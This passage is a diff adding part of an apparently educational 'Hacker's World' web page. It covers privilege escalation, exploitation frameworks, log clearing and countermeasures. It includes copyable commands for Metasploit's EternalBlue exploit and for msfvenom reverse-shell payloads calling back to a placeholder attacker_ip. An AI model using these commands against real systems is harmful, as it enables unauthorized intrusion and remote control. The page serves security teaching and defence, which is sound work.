+          <li><strong>NFS root squashing</strong> — Exploiting NFS misconfiguration</li>
+        </ul>
+        <h6>Automated Tools</h6>
+        <div class="tool-cmd" style="margin-bottom:10px;">
+          <code>./linpeas.sh</code>
+          <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+        </div>
+        <div class="tool-cmd">
+          <code>./linux-exploit-suggester.sh</code>
+          <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Windows PrivEsc -->
+    <div class="accordion-card" data-aos="fade-up" data-aos-delay="50">
+      <div class="accordion-header" onclick="toggleAccordion(this)">
+        <div class="accordion-header-left">
+          <div class="accordion-icon"><i class="bi bi-windows"></i></div>
+          <div>
+            <div class="accordion-title">Windows Privilege Escalation</div>
+            <div class="accordion-subtitle">Escalating to SYSTEM on Windows</div>
+          </div>
+        </div>
+        <i class="bi bi-chevron-down accordion-arrow"></i>
+      </div>
+      <div class="accordion-body">
+        <h6>Enumeration Commands</h6>
+        <ul>
+          <li><strong>System info:</strong> <code style="color:var(--primary)">systeminfo</code></li>
+          <li><strong>Current user:</strong> <code style="color:var(--primary)">whoami /priv</code></li>
+          <li><strong>Network info:</strong> <code style="color:var(--primary)">ipconfig /all</code></li>
+          <li><strong>Running processes:</strong> <code style="color:var(--primary)">tasklist /v</code></li>
+          <li><strong>Installed software:</strong> <code style="color:var(--primary)">wmic product get name</code></li>
+          <li><strong>Scheduled tasks:</strong> <code style="color:var(--primary)">schtasks /query /fo TABLE</code></li>
+          <li><strong>Services:</strong> <code style="color:var(--primary)">sc query state= all</code></li>
+        </ul>
+        <h6>Common Techniques</h6>
+        <ul>
+          <li><strong>Unquoted service paths</strong> — Exploiting spaces in service executable paths</li>
+          <li><strong>DLL hijacking</strong> — Replacing legitimate DLLs in search path</li>
+          <li><strong>Token impersonation</strong> — JuicyPotato, PrintSpoofer, GodPotato</li>
+          <li><strong>AlwaysInstallElevated</strong> — MSI packages installed as SYSTEM</li>
+          <li><strong>Stored credentials</strong> — <code style="color:var(--primary)">cmdkey /list</code></li>
+          <li><strong>Registry autorun</strong> — Modifying autorun entries for privilege escalation</li>
+          <li><strong>Weak service permissions</strong> — Reconfiguring services to execute payloads</li>
+        </ul>
+        <h6>Automated Tools</h6>
+        <div class="tool-cmd" style="margin-bottom:10px;">
+          <code>.\winPEAS.exe</code>
+          <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+        </div>
+        <div class="tool-cmd">
+          <code>powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"</code>
+          <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Exploitation Framework -->
+<section class="content-section" style="padding-top:0;">
+  <div class="container">
+    <div class="section-header" data-aos="fade-up">
+      <h2>Exploitation <span>Frameworks</span></h2>
+      <p>Frameworks and tools used for system exploitation.</p>
+    </div>
+
+    <div class="row">
+      <div class="col-lg-6 mb-4" data-aos="fade-up">
+        <div class="attack-card">
+          <h6><i class="bi bi-bug-fill"></i> Metasploit Framework</h6>
+          <p>The world's most used penetration testing framework. Contains thousands of exploits, payloads, auxiliary modules, and post-exploitation tools. Essential for every ethical hacker.</p>
+          <div class="tool-cmd" style="margin-bottom:8px;">
+            <code>msfconsole</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+          <div class="tool-cmd" style="margin-bottom:8px;">
+            <code>use exploit/windows/smb/ms17_010_eternalblue</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+          <div class="tool-cmd" style="margin-bottom:8px;">
+            <code>set RHOSTS target_ip</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+          <div class="tool-cmd">
+            <code>exploit</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-6 mb-4" data-aos="fade-up" data-aos-delay="100">
+        <div class="attack-card">
+          <h6><i class="bi bi-lightning-fill"></i> Payload Generation (msfvenom)</h6>
+          <p>Standalone payload generator for creating custom shellcode and executables for various platforms and architectures.</p>
+          <div class="tool-cmd" style="margin-bottom:8px;">
+            <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+          <div class="tool-cmd" style="margin-bottom:8px;">
+            <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+          <div class="tool-cmd">
+            <code>msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > shell.php</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Covering Tracks -->
+<section class="content-section" style="padding-top:0;">
+  <div class="container">
+    <div class="section-header" data-aos="fade-up">
+      <h2>Covering <span>Tracks</span></h2>
+      <p>How attackers remove evidence of intrusion (for defense understanding).</p>
+    </div>
+
+    <div class="accordion-card" data-aos="fade-up">
+      <div class="accordion-header" onclick="toggleAccordion(this)">
+        <div class="accordion-header-left">
+          <div class="accordion-icon"><i class="bi bi-terminal-fill"></i></div>
+          <div>
+            <div class="accordion-title">Linux Log Locations &amp; Clearing</div>
+            <div class="accordion-subtitle">Understanding Linux logging for defense</div>
+          </div>
+        </div>
+        <i class="bi bi-chevron-down accordion-arrow"></i>
+      </div>
+      <div class="accordion-body">
+        <h6>Important Log Files</h6>
+        <table class="styled-table">
+          <thead><tr><th>Log File</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code style="color:var(--primary)">/var/log/auth.log</code></td><td>Authentication logs (SSH, sudo, login attempts)</td></tr>
+            <tr><td><code style="color:var(--primary)">/var/log/syslog</code></td><td>General system activity logs</td></tr>
+            <tr><td><code style="color:var(--primary)">/var/log/kern.log</code></td><td>Kernel messages and errors</td></tr>
+            <tr><td><code style="color:var(--primary)">/var/log/apache2/</code></td><td>Apache web server logs</td></tr>
+            <tr><td><code style="color:var(--primary)">~/.bash_history</code></td><td>User command history</td></tr>
+            <tr><td><code style="color:var(--primary)">/var/log/wtmp</code></td><td>Login records (use <code>last</code> to view)</td></tr>
+          </tbody>
+        </table>
+        <h6>Defense: What to Monitor</h6>
+        <ul>
+          <li>Set up <strong>centralized logging</strong> (syslog-ng, rsyslog, ELK Stack)</li>
+          <li>Enable <strong>log integrity monitoring</strong> with tools like OSSEC or Tripwire</li>
+          <li>Configure <strong>immutable logs</strong> that cannot be modified</li>
+          <li>Implement <strong>real-time alerts</strong> for suspicious log patterns</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="accordion-card" data-aos="fade-up" data-aos-delay="50">
+      <div class="accordion-header" onclick="toggleAccordion(this)">
+        <div class="accordion-header-left">
+          <div class="accordion-icon"><i class="bi bi-windows"></i></div>
+          <div>
+            <div class="accordion-title">Windows Event Logs &amp; Defense</div>
+            <div class="accordion-subtitle">Understanding Windows logging for defense</div>
+          </div>
+        </div>
+        <i class="bi bi-chevron-down accordion-arrow"></i>
+      </div>
+      <div class="accordion-body">
+        <h6>Windows Event Log Types</h6>
+        <table class="styled-table">
+          <thead><tr><th>Log</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Security</strong></td><td>Login/logoff events, privilege use, policy changes</td></tr>
+            <tr><td><strong>System</strong></td><td>System events, driver failures, service changes</td></tr>
+            <tr><td><strong>Application</strong></td><td>Application-specific events and errors</td></tr>
+            <tr><td><strong>PowerShell</strong></td><td>PowerShell command execution logs</td></tr>
+            <tr><td><strong>Sysmon</strong></td><td>Advanced process, network, and file monitoring</td></tr>
+          </tbody>
+        </table>
+        <h6>Key Event IDs to Monitor</h6>
+        <ul>
+          <li><strong>4624</strong> — Successful logon</li>
+          <li><strong>4625</strong> — Failed logon attempt</li>
+          <li><strong>4648</strong> — Logon using explicit credentials</li>
+          <li><strong>4672</strong> — Special privileges assigned to new logon</li>
+          <li><strong>4688</strong> — A new process was created</li>
+          <li><strong>4720</strong> — A user account was created</li>
+          <li><strong>1102</strong> — Audit log was cleared</li>
+        </ul>
+        <h6>Defense: Best Practices</h6>
+        <ul>
+          <li>Enable <strong>advanced audit policies</strong> in Group Policy</li>
+          <li>Deploy <strong>Sysmon</strong> for detailed process and network monitoring</li>
+          <li>Forward logs to a <strong>SIEM</strong> (Splunk, ELK, Azure Sentinel)</li>
+          <li>Alert on <strong>Event ID 1102</strong> (audit log cleared)</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Countermeasures -->
+<section class="content-section" style="padding-top:0;">
+  <div class="container">
+    <div class="section-header" data-aos="fade-up">
+      <h2>Counter<span>measures</span></h2>
+      <p>How to defend systems against hacking attempts.</p>
+    </div>
+
+    <div class="row">
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up">
+        <div class="info-card">
+          <div class="info-card-icon"><i class="bi bi-lock-fill"></i></div>
+          <h5>Authentication Defense</h5>
+          <p>
+            • Enforce strong password policies<br>
+            • Implement Multi-Factor Authentication (MFA)<br>
+            • Use account lockout policies<br>
+            • Disable default accounts and credentials<br>
+            • Deploy password managers<br>
+            • Monitor for credential leaks
+          </p>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="100">
+        <div class="info-card">
+          <div class="info-card-icon"><i class="bi bi-shield-fill-check"></i></div>
+          <h5>System Hardening</h5>
+          <p>
+            • Apply principle of least privilege<br>
+            • Keep systems patched and updated<br>
+            • Disable unnecessary services and ports<br>
+            • Implement application whitelisting<br>
+            • Enable full disk encryption<br>
+            • Use EDR/XDR solutions
+          </p>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="200">
+        <div class="info-card">
+          <div class="info-card-icon"><i class="bi bi-eye-fill"></i></div>
+          <h5>Detection &amp; Monitoring</h5>
+          <p>
+            • Deploy SIEM solutions<br>
+            • Enable centralized logging<br>
+            • Use IDS/IPS systems<br>
+            • Monitor for anomalous activity<br>
+            • Conduct regular penetration tests<br>
+            • Implement honeypots and deception technology
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand"><i class="bi bi-shield-lock-fill"></i> HACKER'S WORLD</div>
+      <div class="footer-links">
+        <a href="index.html">Home</a>
+        <a href="Linux_cmd.html">Linux</a>
+        <a href="win-cmd.html">Windows</a>
+        <a href="footprinting.html">Footprinting</a>
+        <a href="scanning.html">Scanning</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>&copy; 2024 Hacker's World. All Rights Reserved. Educational purposes only.</p>
+    </div>
+  </div>
+</footer>
+
+<!-- Scripts -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+
+<script>
+  AOS.init({ once: true, duration: 600 });
+
+  window.addEventListener('scroll', function () {
+    var nb = document.getElementById('mainNavbar');
+    var bt = document.getElementById('backToTop');
+    nb.classList.toggle('scrolled', window.scrollY > 50);
+    bt.style.display = window.scrollY > 300 ? 'flex' : 'none';
+  });
+
+  document.getElementById('backToTop').addEventListener('click', function () {
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+
+  function toggleAccordion(header) {
+    var body = header.nextElementSibling;
+    var arrow = header.querySelector('.accordion-arrow');
+    var isOpen = body.style.display === 'block';
+    body.style.display = isOpen ? 'none' : 'block';
+    arrow.classList.toggle('rotated', !isOpen);
+  }
+
+  function copyTool(btn) {
+    var code = btn.parentElement.querySelector('code');
+    var text = code.textContent.trim();
+    navigator.clipboard.writeText(text).then(function () {
+      btn.innerHTML = '<i class="bi bi-check-lg"></i>';
+      showToast('Command copied to clipboard!');
+      setTimeout(function () { btn.innerHTML = '<i class="bi bi-clipboard"></i>'; }, 2000);
+    });
+  }
+
+  function showToast(msg) {
+    var t = document.getElementById('toast');
+    document.getElementById('toastMsg').textContent = msg;
+    t.style.display = 'block';
+    setTimeout(function () { t.style.display = 'none'; }, 2500);
+  }
+</script>
+
+</body>
+</html>
